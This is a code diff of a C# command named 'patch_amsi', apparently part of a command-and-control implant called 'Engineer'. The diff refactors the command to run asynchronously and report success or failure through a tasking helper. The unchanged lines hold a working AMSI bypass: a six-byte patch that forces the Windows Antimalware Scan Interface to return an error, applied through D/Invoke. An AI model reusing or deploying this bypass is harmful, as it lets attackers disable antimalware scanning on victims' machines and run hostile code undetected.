@@ -7,6 +7,7 @@ using System.Security.Policy;
 using System.Text;
 using System.Threading.Tasks;
 using Engineer.Extra;
+using Engineer.Functions;
 using Engineer.Models;
 
 namespace Engineer.Commands
@@ -15,7 +16,7 @@ namespace Engineer.Commands
     {
         public override string Name => "patch_amsi";
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             try
             {                
@@ -29,15 +30,15 @@ namespace Engineer.Commands
                     byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                     Patch( patch);
                 }
-               
-               
 
-                return "AMSI Patched with D/Invoke";
+
+
+                Tasking.FillTaskResults("AMSI Patched with D/Invoke",task,EngTaskStatus.Complete);
             }
             catch (Exception e)
             {
                 var error = "error: " + "[!] {patch failed}" + e.Message;
-                return error;
+                Tasking.FillTaskResults(error,task,EngTaskStatus.Failed);
             }
         }
         
